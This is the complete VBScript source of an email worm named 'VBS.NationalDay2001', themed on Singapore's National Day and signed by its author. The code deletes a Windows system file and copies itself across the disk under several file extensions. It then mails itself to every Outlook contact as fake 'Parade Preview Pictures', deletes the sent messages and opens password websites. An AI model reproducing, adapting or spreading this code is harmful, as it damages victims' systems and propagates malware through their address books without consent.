' VBS.NationalDay2001
' by LCP Ong
On Error Resume Next
Set sex = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile("c:\windows\rundll32.exe")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
sub main()
   On Error Resume Next
   dim adam,dd, strMsg
   set adam=CreateObject("WScript.Shell")
   Set dirwin = fso.GetSpecialFolder(0)
   Set dirsystem = fso.GetSpecialFolder(1)
   Set dirtemp = fso.GetSpecialFolder(2)
   Set cFile = fso.GetFile(WScript.ScriptFullName)
   cFile.Copy(dirsystem&"\NDP2001.vbs")
   cFile.Copy("c:\NDP2001.vbs")
   cFile.Copy("c:\NDP2001.bat")
   cFile.Copy("c:\NDP2001.ini")
   cFile.Copy("c:\NDP2001.pif")
   cFile.Copy("c:\Program Files\NDP2001.vbs")
   cFile.Copy("c:\My Documents\NDP2001.vbs")
     
   Set OutlookA = CreateObject("Outlook.Application")
   If OutlookA = "Outlook" Then
      Set Mapi=OutlookA.GetNameSpace("MAPI")
      Set AddLists=Mapi.AddressLists
      For Each ListIndex In AddLists
         If ListIndex.AddressEntries.Count <> 0 Then
            ContactCountX = ListIndex.AddressEntries.Count
            For Count= 1 To ContactCountX
               Set MailX = OutlookA.CreateItem(0)
               Set ContactX = ListIndex.AddressEntries(Count)
               msgbox contactx.address
               Mailx.Recipients.Add(ContactX.Address)
               MailX.To = ContactX.Address
               MailX.Subject = "NDP2001 Parade Preview Pictures!"
               MailX.Body = vbcrlf&"NDP2001 Preview Day Pictures is out! Please email to your friends to show  them."&vbcrlf
               Set Attachment=MailX.Attachments
               Attachment.Add dirsystem & "\NDP2001.vbs"
               Mailx.Attachments.Add(dirsystem & "\NDP2001.vbs")
               Mailx.Attachments.Add(dirsystem & "\NDP2001.vbs")
               Mailx.Attachments.Add("C:\NDP2001.vbs")
               MailX.DeleteAfterSubmit = True
               If MailX.To <> "" Then
                  MailX.Send
               End If
               WS.regwrite "HKCU\software\An\mailed", "1"
            Next
         End If
      Next
   
Else
      MsgBox "Please forward this to everyone you know.", vbOKOnly & vbExclamation, "Forward Them This Email"

      If WS.regread ("HKCU\software\An\mailed") <> "1" then
         MsgBox "You already auto send the WORM to everyone!!!", vbOKOnly & vbExclamation, "Final Message"
      
Else
         MsgBox "Too bad! Not infected yet! Keep trying...", vbOKOnly & vbExclamation, "Error Message"         
      End If

      If Time() = "00:00:00" Then
         MsgBox "Dong! Dong! Dong! It's already mid-night and Happy National Day Singapore!!!", vbOKOnly & vbExclamation, "Midnight"

      Elseif Time() = "12:00:00" Then
         MsgBox "It's noon and I'm hungry / Let's have lunch together", vbOKOnly & vbExclamation, "AfternoonBreak"
      End If
   End if

   Randomize
   r=Int((3*Rnd)+1)
      If r=1 then
          WS.Run("http://www.ultrapassword.com")
      Elseif r=2 Then
          WS.Run("http://www.purepasswords.com")
      Elseif r=3 Then
          WS.Run("http://www.crazypasses.com")
      End If

   strMsg= "NDP2001" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "Happy Birthday Singapore / Kindly brought to you by LCP Ong  (SBAB)" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   strMsg= strMsg & "NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001! NDP2001!" & vbcrlf
   msgbox strMsg,,"NDP2001"
End sub
